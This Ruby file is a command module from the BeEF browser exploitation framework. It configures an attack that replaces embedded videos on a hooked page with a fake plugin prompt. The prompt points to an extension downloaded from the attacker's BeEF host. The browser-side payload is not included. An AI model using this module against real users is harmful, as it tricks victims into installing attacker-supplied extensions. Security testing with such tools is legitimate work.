#
# Copyright (c) 2006-2021 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Replace_video_fake_plugin < BeEF::Core::Command

  def self.options
    configuration = BeEF::Core::Configuration.instance
    proto = configuration.beef_proto
    beef_host = configuration.beef_host
    beef_port = configuration.beef_port
    url = "#{proto}://#{beef_host}:#{beef_port}"
    return [
        {'name' => 'url', 'ui_label' => 'Plugin URL', 'value' => url+'/api/ipec/ff_extension', 'width'=>'150px'},
        {'name' => 'jquery_selector', 'ui_label' => 'jQuery Selector', 'value' => 'embed', 'width'=>'150px'}
    ]
  end

  def post_execute
    content = {}
    content['Result'] = @datastore['result']
    save content
  end

end
